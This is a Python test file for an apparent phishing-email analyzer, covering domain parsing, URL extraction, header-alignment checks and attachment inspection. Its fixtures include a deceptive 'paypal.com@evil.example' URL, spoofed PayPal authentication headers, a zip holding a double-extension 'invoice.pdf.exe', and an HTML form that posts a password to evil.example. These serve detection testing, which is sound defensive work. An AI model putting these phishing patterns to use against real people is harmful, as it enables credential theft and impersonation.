import zipfile
from pathlib import Path


from email_analysis.domain_utils import registered_domain, same_registered_domain
from email_analysis.header_analyzer import analyze_headers
from email_analysis.url_extractor import extract_urls
from report.report_generator import generate_report


def test_public_suffix_registered_domain_logic() -> None:
    assert registered_domain("login.paypal.co.uk") == "paypal.co.uk"
    assert registered_domain("tenant.github.io") == "tenant.github.io"
    assert same_registered_domain("a.example.co.uk", "b.example.co.uk")


def test_url_userinfo_obfuscation_uses_real_host() -> None:
    urls = extract_urls("Click https://paypal.com@evil.example/login/verify now")

    assert len(urls) == 1
    assert urls[0]["domain"] == "evil.example"
    assert urls[0]["registered_domain"] == "evil.example"
    assert urls[0]["has_userinfo"] is True
    assert urls[0]["url_risk_score"] >= 18


def test_url_extractor_skips_malformed_url_without_stopping_analysis() -> None:
    urls = extract_urls(
        "https://valid.test/login and malformed http://[::1 and https://other.test/"
    )

    assert [item["url"] for item in urls] == [
        "https://other.test/",
        "https://valid.test/login",
    ]


def test_report_discloses_truncated_evidence() -> None:
    report = generate_report(
        email_data={},
        auth_results={},
        urls=[],
        attachments=[],
        risk={"score": 0, "verdict": "LOW"},
        vt_url_reports=[],
        vt_hash_reports=[],
        otx_reports=[],
        analysis_limits={
            "urls_truncated": True,
            "attachments_truncated": True,
            "max_urls": 50,
            "max_attachments": 25,
        },
    )

    assert "URL analysis limited to the first 50 indicators" in report
    assert "Attachment analysis limited to the first 25 attachments" in report


def test_auth_alignment_flags_spf_pass_mismatch() -> None:
    headers = [
        ("From", "PayPal Security <alerts@paypal.com>"),
        (
            "Authentication-Results",
            "mx.example; spf=pass smtp.mailfrom=evil.example; "
            "dkim=none; dmarc=none header.from=paypal.com",
        ),
        ("Received", "from evil.example (evil.example [203.0.113.10]) by mx.example"),
    ]

    result = analyze_headers(headers)

    finding_types = {f["type"] for f in result["alignment"]["findings"]}
    assert "spf_alignment_mismatch" in finding_types
    assert "no_aligned_authentication" in finding_types


def test_attachment_deep_inspection_detects_archive_payload_and_html(
    tmp_path: Path,
) -> None:
    from email_analysis.attachment_analyzer import assess_attachment_risk

    zip_path = tmp_path / "payload.zip"
    with zipfile.ZipFile(zip_path, "w") as archive:
        archive.writestr("invoice.pdf.exe", b"MZ")

    html_path = tmp_path / "login.html"
    html_path.write_text(
        "<form method='POST' action='https://evil.example/post'>"
        "<input type='password'></form>",
        encoding="utf-8",
    )

    findings = assess_attachment_risk(
        [
            {
                "filename": "payload.zip",
                "content_type": "application/zip",
                "size_bytes": zip_path.stat().st_size,
                "sha256": "a" * 64,
                "saved_path": str(zip_path),
            },
            {
                "filename": "login.html",
                "content_type": "text/html",
                "size_bytes": html_path.stat().st_size,
                "sha256": "b" * 64,
                "saved_path": str(html_path),
            },
        ]
    )

    warnings = "\n".join(w for f in findings for w in f["warnings"])
    assert "Archive contains executable/script payload" in warnings
    assert "HTML attachment contains credential-harvesting indicators" in warnings


def test_zip_macro_project_detection(tmp_path: Path) -> None:
    from email_analysis.attachment_analyzer import assess_attachment_risk

    docm_path = tmp_path / "macro.docm"
    with zipfile.ZipFile(docm_path, "w") as archive:
        archive.writestr("word/vbaProject.bin", b"macro")

    findings = assess_attachment_risk(
        [
            {
                "filename": "macro.docm",
                "content_type": "application/vnd.ms-word.document.macroEnabled.12",
                "size_bytes": docm_path.stat().st_size,
                "sha256": "c" * 64,
                "saved_path": str(docm_path),
            }
        ]
    )

    assert findings[0]["category"] == "macro_document"
    assert any("VBA macro project" in w for w in findings[0]["warnings"])
